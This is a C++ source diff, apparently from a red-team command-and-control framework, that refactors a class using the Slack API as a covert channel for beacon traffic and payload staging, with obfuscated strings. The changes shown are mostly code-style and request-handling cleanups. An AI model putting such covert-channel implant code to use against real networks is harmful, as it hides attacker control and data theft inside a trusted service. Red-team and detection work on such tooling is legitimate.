@@ -18,24 +18,24 @@ FSecure::Slack::Slack(std::string const& token, std::string const& channelName)
 	SetChannel(CreateChannel(lowerChannelName));
 }
 
-void FSecure::Slack::SetChannel(std::string const &channelId)
+void FSecure::Slack::SetChannel(std::string const& channelId)
 {
 	this->m_Channel = channelId;
 }
 
-void FSecure::Slack::SetToken(std::string const &token)
+void FSecure::Slack::SetToken(std::string const& token)
 {
 	this->m_Token = token;
 }
 
-std::string FSecure::Slack::WriteMessage(std::string text)
+std::string FSecure::Slack::WriteMessage(std::string const& text)
 {
 	json j;
 	j[OBF("channel")] = this->m_Channel;
 	j[OBF("text")] = text;
 	std::string url = OBF("https://slack.com/api/chat.postMessage");
 
-	json output = SendHttpRequest(url, OBF("application/json"), j);
+	json output = SendJsonRequest(url, j);
 
 	return output[OBF("message")][OBF("ts")].get<std::string>(); //return the timestamp so a reply can be viewed
 }
@@ -45,9 +45,9 @@ std::string FSecure::Slack::WriteMessage(std::string text)
 std::map<std::string, std::string> FSecure::Slack::ListChannels()
 {
 	std::map<std::string, std::string> channelMap;
-	std::string url = OBF("https://slack.com/api/channels.list?token=") + this->m_Token + OBF("&exclude_members=true&exclude_archived=true");
+	std::string url = OBF("https://slack.com/api/channels.list?exclude_members=true&exclude_archived=true");
 
-	json response = SendHttpRequest(url, OBF("application/json"), NULL);
+	json response = SendJsonRequest(url, NULL);
 
 	for (auto &channel : response[OBF("channels")])
 	{
@@ -64,14 +64,13 @@ std::map<std::string, std::string> FSecure::Slack::ListChannels()
 
 
 
-std::string FSecure::Slack::CreateChannel(std::string const &channelName)
+std::string FSecure::Slack::CreateChannel(std::string const& channelName)
 {
 	json j;
 	std::string url = OBF("https://slack.com/api/channels.create");
-	j[OBF("token")] = this->m_Token;
 	j[OBF("name")] = channelName;
 
-	json response = SendHttpRequest(url, OBF("application/json"), j);
+	json response = SendJsonRequest(url, j);
 
 	if (!response.contains(OBF("channel"))) //attempt to find the channel using API call
 	{
@@ -91,10 +90,10 @@ std::string FSecure::Slack::CreateChannel(std::string const &channelName)
 }
 
 
-std::vector<json> FSecure::Slack::ReadReplies(std::string const &timestamp)
+std::vector<json> FSecure::Slack::ReadReplies(std::string const& timestamp)
 {
-	std::string url = OBF("https://slack.com/api/channels.replies?token=") + this->m_Token + OBF("&channel=") + this->m_Channel + OBF("&thread_ts=") + timestamp;
-	json output = SendHttpRequest(url, OBF("application/json"), NULL);
+	std::string url = OBF("https://slack.com/api/channels.replies?channel=") + this->m_Channel + OBF("&thread_ts=") + timestamp;
+	json output = SendJsonRequest(url, NULL);
 	std::vector<json> ret;
 
 	//This logic is really messy, in reality the checks are over cautious, however there is an edgecase
@@ -102,7 +101,7 @@ std::vector<json> FSecure::Slack::ReadReplies(std::string const &timestamp)
 	//If that was the case, and we didn't sanity check, we could run into problems.
 	if (output.contains(OBF("messages")))
 	{
-		json m = output[OBF("messages")];
+		json const& m = output[OBF("messages")];
 		if (m[0].contains(OBF("replies")) && m[0].size() > 1)
 		{
 			if (m[1].contains(OBF("files"))) //the reply contains a file, handle this differently
@@ -110,18 +109,20 @@ std::vector<json> FSecure::Slack::ReadReplies(std::string const &timestamp)
 				std::string ts = m[1][OBF("ts")];
 				std::string fileUrl = m[1][OBF("files")][0][OBF("url_private")].get<std::string>();
 				std::string text = GetFile(fileUrl);
+
 				//recreate a "message" from the data within the file.
-				json j;
-				j[OBF("ts")] = ts.c_str();
-				j[OBF("text")] = text.c_str();
-				ret.push_back(j);
+				json j
+				{
+					{ OBF("ts"), std::move(ts)},
+					{ OBF("text"), std::move(text) }
+				};
+				ret.emplace_back(std::move(j));
 			}
 			else
 			{
 				for (size_t i = 1u; i < m.size(); i++) //skip the first message (it doesn't contain the data we want).
 				{
-					json reply = m[i];
-					ret.push_back(reply);
+					ret.emplace_back(std::move(m[i]));
 				}
 
 			}
@@ -132,7 +133,7 @@ std::vector<json> FSecure::Slack::ReadReplies(std::string const &timestamp)
 	return ret;
 }
 
-std::vector<std::string>  FSecure::Slack::GetMessagesByDirection(std::string const &direction)
+std::vector<std::string>  FSecure::Slack::GetMessagesByDirection(std::string const& direction)
 {
 	std::vector<std::string> ret;
 	json messages, resp;
@@ -144,15 +145,14 @@ std::vector<std::string>  FSecure::Slack::GetMessagesByDirection(std::string con
 	//This only becomes a problem with lots of beacons (especially if many are staging at the same time)
 	do
 	{
-		std::string url = OBF("https://slack.com/api/conversations.history?limit=200&token=");
-		url.append(this->m_Token + OBF("&") + OBF("channel=") + this->m_Channel);
+		std::string url = OBF("https://slack.com/api/conversations.history?limit=200&channel=") + this->m_Channel;
 
 		//Will be empty on the first run, if has_more == false this won't be executed again
 		if (!cursor.empty())
 			url.append(OBF("&cursor=") + cursor);
 
 		//Actually send the http request and grab the messages
-		resp = SendHttpRequest(url, OBF("application/json"), NULL);
+		resp = SendJsonRequest(url, NULL);
 
 		messages = resp[OBF("messages")];
 
@@ -177,7 +177,7 @@ std::vector<std::string>  FSecure::Slack::GetMessagesByDirection(std::string con
 	return ret;
 }
 
-void FSecure::Slack::UpdateMessage(std::string const &message, std::string const &timestamp)
+void FSecure::Slack::UpdateMessage(std::string const& message, std::string const& timestamp)
 {
 	std::string url = OBF("https://slack.com/api/chat.update");
 
@@ -186,10 +186,10 @@ void FSecure::Slack::UpdateMessage(std::string const &message, std::string const
 	j[OBF("text")] = message;
 	j[OBF("ts")] = timestamp;
 
-	SendHttpRequest(url, OBF("application/json"), j);
+	SendJsonRequest(url, j);
 }
 
-void FSecure::Slack::WriteReply(std::string const &text, std::string const &timestamp)
+void FSecure::Slack::WriteReply(std::string const& text, std::string const& timestamp)
 {
 	//this is more than 30 messages, send it as a file (we do this infrequently as file uploads restricted to 20 per minute).
 	//Using file upload for staging (~88 messages) is a huge improvement over sending actual replies.
@@ -210,23 +210,22 @@ void FSecure::Slack::WriteReply(std::string const &text, std::string const &time
 	j[OBF("thread_ts")] = timestamp;
 	std::string url = OBF("https://slack.com/api/chat.postMessage");
 
-	json response = SendHttpRequest(url, OBF("application/json"), j);
+	json response = SendJsonRequest(url, j);
 }
 
-void FSecure::Slack::DeleteMessage(std::string const &timestamp)
+void FSecure::Slack::DeleteMessage(std::string const& timestamp)
 {
 	json j;
 	j[OBF("channel")] = this->m_Channel;
 	j[OBF("ts")] = timestamp;
-	j[OBF("token")] = this->m_Token;
 	std::string url = OBF("https://slack.com/api/chat.delete");
 
-	json response = SendHttpRequest(url, OBF("application/json"), j);
+	json response = SendJsonRequest(url, j);
 
 }
 
 //Slack limits a messages to 40000 characters - this actually gets split across 10 4000 character messages
-void FSecure::Slack::WriteReplyLarge(std::string const &data, std::string const &ts)
+void FSecure::Slack::WriteReplyLarge(std::string const& data, std::string const& ts)
 {
 	std::string ret;
 	int start = 0;
@@ -246,76 +245,58 @@ void FSecure::Slack::WriteReplyLarge(std::string const &data, std::string const 
 	this->WriteReply(data.substr(start, data.length()), ts); //write the final part of the payload
 }
 
-json FSecure::Slack::SendHttpRequest(std::string const& host, std::string const& contentType, json const& data)
+json FSecure::Slack::SendHttpRequest(std::string const& host, std::string const& contentType, std::string const& data)
 {
-	std::string authHeader = OBF("Bearer ") + this->m_Token;
-	std::string contentHeader = OBF("Content-Type: ") + contentType;
-	std::string postData;
-
 	while (true)
 	{
 		web::http::client::http_client webClient(utility::conversions::to_string_t(host), this->m_HttpConfig);
-		web::http::http_request request;
+		web::http::http_request request; // default request is GET
 
-		if (data != NULL)
+		if (!data.empty())
 		{
-			request = web::http::http_request(web::http::methods::POST);
-
-			if (data.contains(OBF("postData")))
-				postData = data[OBF("postData")].get<std::string>();
-			else
-				postData = data.dump();
+			request.set_method(web::http::methods::POST);
 
 			request.headers().set_content_type(utility::conversions::to_string_t(contentType));
-			request.set_body(utility::conversions::to_string_t(postData));
+			request.set_body(utility::conversions::to_string_t(data));
 		}
-		else
-		{
-			request = web::http::http_request(web::http::methods::GET);
-		}
-		request.headers().add(OBF(L"Authorization"), utility::conversions::to_string_t(authHeader));
 
-		pplx::task<web::http::http_response> task = webClient.request(request).then([&](web::http::http_response response)
-			{
-				return response;
-			});
+		request.headers().add(OBF(L"Authorization"), OBF(L"Bearer ") + utility::conversions::to_string_t(this->m_Token));
 
-		task.wait();
-		web::http::http_response resp = task.get();
+		web::http::http_response resp = webClient.request(request).get();
 
 		if (resp.status_code() == web::http::status_codes::OK)
 		{
-			auto respData = resp.extract_string();
-			return json::parse(respData.get());
+			auto respData = resp.extract_string().get();
+			return json::parse(respData);
 		}
 		else if (resp.status_code() == web::http::status_codes::TooManyRequests)
 		{
-			std::random_device randomDevice;
-			std::mt19937 randomEngine(randomDevice()); // seed the generator
-			std::uniform_int_distribution<> distribution(0, 10); // define the range
-			int sleepTime = 10 + distribution(randomEngine); //sleep between 10 and 20 seconds
-
-			std::this_thread::sleep_for(std::chrono::seconds(sleepTime));
+			//sleep between 10 and 20 seconds
+			std::this_thread::sleep_for(Utils::GenerateRandomValue(10s, 20s));
 		}
 		else
 			throw std::exception(OBF("[x] Non 200/429 HTTP Response\n"));
 	}
 }
 
-void FSecure::Slack::UploadFile(std::string const &data, std::string const &ts)
+json FSecure::Slack::SendJsonRequest(std::string const& url, json const& data)
 {
-	std::string url = OBF("https://slack.com/api/files.upload?token=") + this->m_Token + OBF("&channels=") + this->m_Channel + OBF("&thread_ts=") + ts;
+	return SendHttpRequest(url, OBF("application/json"), data.dump());
+}
+
+void FSecure::Slack::UploadFile(std::string const& data, std::string const& ts)
+{
+	std::string url = OBF_STR("https://slack.com/api/files.upload?") + OBF("&channels=") + this->m_Channel + OBF("&thread_ts=") + ts;
 
 	std::string encoded = utility::conversions::to_utf8string(web::http::uri::encode_data_string(utility::conversions::to_string_t(data)));
 
-	json toSend;
-	toSend[OBF("postData")] = OBF("filename=test5&content=") + encoded;
+	std::string toSend = OBF("filename=test5&content=") + encoded;
 
 	json response = SendHttpRequest(url, OBF("application/x-www-form-urlencoded"), toSend);
 }
 
 
-std::string FSecure::Slack::GetFile(std::string const &url)
+std::string FSecure::Slack::GetFile(std::string const& url)
 {
 	std::string host = url;
 	std::string authHeader = OBF("Bearer ") + this->m_Token;
@@ -325,16 +306,9 @@ std::string FSecure::Slack::GetFile(std::string const &url)
 
 	request.headers().add(OBF(L"Authorization"), utility::conversions::to_string_t(authHeader));
 
-	pplx::task<std::string> task = webClient.request(request).then([&](web::http::http_response response)
-		{
-			if (response.status_code() == web::http::status_codes::OK)
-				return response.extract_utf8string();
-			else
-				return pplx::task<std::string>{};
-		});
-
-	task.wait();
-	std::string resp = task.get();
-
-	return resp;
+	web::http::http_response response = webClient.request(request).get();
+	if (response.status_code() == web::http::status_codes::OK)
+		return response.extract_utf8string().get();
+	else
+		return {};
 }
